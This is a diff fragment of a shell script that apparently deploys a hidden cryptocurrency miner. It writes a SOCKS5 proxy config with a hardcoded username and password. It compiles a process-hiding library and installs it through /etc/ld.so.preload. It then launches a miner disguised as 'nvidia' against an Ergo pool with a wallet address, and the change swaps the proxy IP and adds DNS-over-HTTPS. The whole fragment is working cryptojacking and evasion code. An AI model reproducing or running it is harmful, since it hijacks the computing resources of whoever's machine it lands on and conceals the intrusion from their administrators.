@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.16.66.235:1080
+socks5 = 52.15.235.202:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./nvidia --algo AUTOLYKOS2 --pool stratum-ergo.flypool.org:3443 --user 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.Nvidia --tls on --longstats 5 --shortstats 5 --timeprint on --log on --basecolor
+./graftcp/graftcp ./nvidia --algo AUTOLYKOS2 --pool stratum-ergo.flypool.org:3443 --user 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.Nvidia --dns-over-https 2 --tls on --longstats 5 --shortstats 5 --timeprint on --log on --basecolor
